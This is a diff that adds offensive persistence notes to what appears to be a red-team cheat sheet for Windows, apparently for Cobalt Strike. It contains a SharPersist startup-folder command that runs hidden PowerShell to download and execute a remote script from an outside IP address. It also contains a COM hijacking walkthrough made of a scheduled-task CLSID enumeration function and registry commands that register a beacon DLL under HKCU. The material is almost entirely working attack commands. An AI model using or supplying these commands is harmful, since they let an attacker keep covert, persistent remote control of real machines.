@@ -81,3 +81,55 @@ In below mentioned example, adding a task which will make an HTTP request to Tea
 #### 3. Startup Folder
 ---
 
+    SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden IEX ((new-object net.webclient).downloadstring('http://192.168.56.104/ps.ps1'))"  -f "b0x" -m add
+    
+        
+#### 4. Com Hijack
+
+    function pwn {
+     $Tasks = Get-ScheduledTask
+
+    foreach ($Task in $Tasks)
+    {
+    if ($Task.Actions.ClassId -ne $null)
+    {
+    if ($Task.Triggers.Enabled -eq $true)
+    {
+      if ($Task.Principal.GroupId -eq "Users")
+      {
+        Write-Host "Task Name: " $Task.TaskName
+        Write-Host "Task Path: " $Task.TaskPath
+        Write-Host "CLSID: " $Task.Actions.ClassId
+        Write-Host
+      }
+     }
+    }
+    }
+    }
+    
+ Import the PowerShell code using below mentioned command:
+ 
+    powershell-import /path_to/enu.ps1
+   
+ Now, execute the code using Powerpick or PowerShell
+ 
+    powerpick pwn
+
+or
+
+    powershell pwn
+
+Below mentioned command will show the information regarding CLSID from the HKCR registry entry
+
+    powershell Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | fl
+    
+ Now execute below mentioned commands to verify whether entry for CLSID exists in HKCU or not:
+ 
+    powerpick Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
+    
+ Output is showing, the entry for CLSID exists in HKLM only.
+ 
+    powerpick New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
+    powerpick New-Item -PATH "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" -Name "InprocServer32" -Value "c:\Users\Administrator\Desktop\beacon.dll"
+    powerpick New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}\InprocServer32" -Name "ThreadingModel" -Value "Both"
+ 
